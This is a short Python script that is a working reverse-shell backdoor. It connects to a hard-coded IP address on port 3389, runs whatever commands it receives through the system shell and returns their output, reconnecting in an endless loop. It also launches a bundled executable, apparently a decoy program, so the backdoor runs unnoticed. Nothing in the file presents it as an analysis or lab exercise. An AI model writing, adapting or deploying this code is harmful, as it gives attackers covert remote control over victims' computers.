import os
import socket
import subprocess
import time


host = '68.183.103.32'
port = 3389

def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(str.encode("[*] Connection Established!\n"))
    while 1:
        try:       
            time.sleep(3)
            s.send(str.encode(os.getcwd() + "> "))
            data = s.recv(1024).decode("UTF-8")
            data = data.strip('\n')
            if data == "quit": 
                break
            if data[:2] == "cd":
                os.chdir(data[3:])
            if len(data) > 0:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                stdout_value = proc.stdout.read() + proc.stderr.read()
                output_str = str(stdout_value, "UTF-8")
                s.send(str.encode("\n" + output_str))
        except Exception as e:
             break
    s.close()

os.popen(resource_path('nppi.exe'))

while 1:
    try:
        shell()
        sleep(5)
    except Exception as f:
        continue